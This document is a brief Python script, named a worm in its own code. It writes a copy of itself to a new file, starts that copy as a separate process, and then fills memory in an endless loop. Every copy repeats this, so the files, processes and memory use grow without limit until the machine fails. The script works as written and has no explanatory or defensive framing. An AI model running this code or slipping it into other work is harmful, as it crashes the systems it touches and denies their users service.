import random,subprocess
worm_id = int(random.random()*10000000000000000)
with open("worm"+str(worm_id)+".py", "w+") as worm:
    for line in open(__file__, "r").readlines():
        worm.write(line)
subprocess.Popen(["python", "worm"+str(worm_id)+".py"])
kill_count = []
try:
    while True:
        kill_count.append(str(random.random()))
        kill_count.append(1)
except:
    pass
